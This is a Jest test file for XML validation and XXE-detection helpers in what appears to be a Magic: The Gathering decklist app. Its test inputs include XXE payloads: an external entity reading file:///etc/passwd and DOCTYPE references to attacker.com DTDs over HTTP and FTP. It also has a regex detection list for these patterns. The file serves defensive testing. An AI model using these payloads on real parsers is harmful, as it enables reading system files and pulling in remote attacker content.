import { describe, test, expect } from '@jest/globals';

// Mock the security functions from controller.mjs
function isValidXML(xmlText) {
  try {
    if (!xmlText.trim().startsWith('<?xml') && !xmlText.trim().startsWith('<')) {
      return false;
    }

    const hasOpeningTag = xmlText.includes('<');
    const hasClosingTag = xmlText.includes('>');

    return hasOpeningTag && hasClosingTag;
  } catch (error) {
    return false;
  }
}

function containsXXEPatterns(xmlText) {
  const xxePatterns = [
    /<!ENTITY/i, // Entity declarations
    /<!DOCTYPE.*\[/i, // DOCTYPE with internal subset
    /SYSTEM\s+["']file:/i, // External file references
    /SYSTEM\s+["']http/i, // External HTTP references
    /SYSTEM\s+["']ftp/i, // External FTP references
    /PUBLIC\s+.*SYSTEM/i, // Public external references
    /&#x[0-9a-fA-F]+;/, // Hex character references (potential bypass)
    /&#[0-9]+;/, // Decimal character references (potential bypass)
  ];

  return xxePatterns.some(pattern => pattern.test(xmlText));
}

describe('Security Functions', () => {
  describe('isValidXML', () => {
    test('should accept valid XML with XML declaration', () => {
      const validXML = '<?xml version="1.0" encoding="UTF-8"?><root></root>';
      expect(isValidXML(validXML)).toBe(true);
    });

    test('should accept valid XML without XML declaration', () => {
      const validXML = '<root><child>content</child></root>';
      expect(isValidXML(validXML)).toBe(true);
    });

    test('should reject non-XML content', () => {
      const invalidXML = 'This is just plain text';
      expect(isValidXML(invalidXML)).toBe(false);
    });

    test('should reject malformed XML', () => {
      const malformedXML = '<root><child>unclosed';
      // Note: this basic validation only checks for presence of < and >
      // More sophisticated XML validation would require proper parsing
      expect(isValidXML(malformedXML)).toBe(true); // Basic check passes
    });

    test('should handle empty string', () => {
      expect(isValidXML('')).toBe(false);
    });

    test('should handle whitespace', () => {
      const xmlWithWhitespace = '   <?xml version="1.0"?><root></root>   ';
      expect(isValidXML(xmlWithWhitespace)).toBe(true);
    });
  });

  describe('containsXXEPatterns', () => {
    test('should detect ENTITY declarations', () => {
      const xxeXML =
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "malicious">]><root>&xxe;</root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect DOCTYPE with internal subset', () => {
      const xxeXML = '<?xml version="1.0"?><!DOCTYPE test [<!ELEMENT test ANY>]><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect external file references', () => {
      const xxeXML =
        '<?xml version="1.0"?><!DOCTYPE test SYSTEM "file:///etc/passwd"><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect external HTTP references', () => {
      const xxeXML =
        '<?xml version="1.0"?><!DOCTYPE test SYSTEM "http://attacker.com/evil.dtd"><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect external FTP references', () => {
      const xxeXML =
        '<?xml version="1.0"?><!DOCTYPE test SYSTEM "ftp://attacker.com/evil.dtd"><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect PUBLIC external references', () => {
      const xxeXML =
        '<?xml version="1.0"?><!DOCTYPE test PUBLIC "public" SYSTEM "system"><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect hex character references', () => {
      const xxeXML = '<root>&#x41;</root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should detect decimal character references', () => {
      const xxeXML = '<root>&#65;</root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });

    test('should allow safe XML content', () => {
      const safeXML = `<?xml version="1.0" encoding="UTF-8"?>
        <Decklist Deck="BlackRack">
          <DesignGoal>Legacy: Combine The Rack and Discard</DesignGoal>
          <Card>
            <Name>Lightning Bolt</Name>
            <Quantity>4</Quantity>
            <Type>Instant</Type>
            <Cost>{R}</Cost>
            <RulesText>Lightning Bolt deals 3 damage to any target.</RulesText>
          </Card>
        </Decklist>`;
      expect(containsXXEPatterns(safeXML)).toBe(false);
    });

    test('should handle case insensitive patterns', () => {
      const xxeXML = '<?xml version="1.0"?><!doctype test [<!entity xxe "bad">]><root></root>';
      expect(containsXXEPatterns(xxeXML)).toBe(true);
    });
  });

  describe('Combined Security Validation', () => {
    test('should validate typical MTG deck XML', () => {
      const deckXML = `<?xml version="1.0" encoding="UTF-8"?>
        <Decklist Deck="Test Deck">
          <DesignGoal>Test deck for validation</DesignGoal>
          <Card>
            <Name>Lightning Bolt</Name>
            <Quantity>4</Quantity>
            <Type>Instant</Type>
            <Cost>{R}</Cost>
            <RulesText>Lightning Bolt deals 3 damage to any target.</RulesText>
          </Card>
        </Decklist>`;

      expect(isValidXML(deckXML)).toBe(true);
      expect(containsXXEPatterns(deckXML)).toBe(false);
    });

    test('should reject malicious XML attempts', () => {
      const maliciousXML = `<?xml version="1.0"?>
        <!DOCTYPE test [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <Decklist Deck="Malicious">
          <DesignGoal>&xxe;</DesignGoal>
        </Decklist>`;

      expect(isValidXML(maliciousXML)).toBe(true); // Structure is valid
      expect(containsXXEPatterns(maliciousXML)).toBe(true); // But contains XXE
    });
  });
});
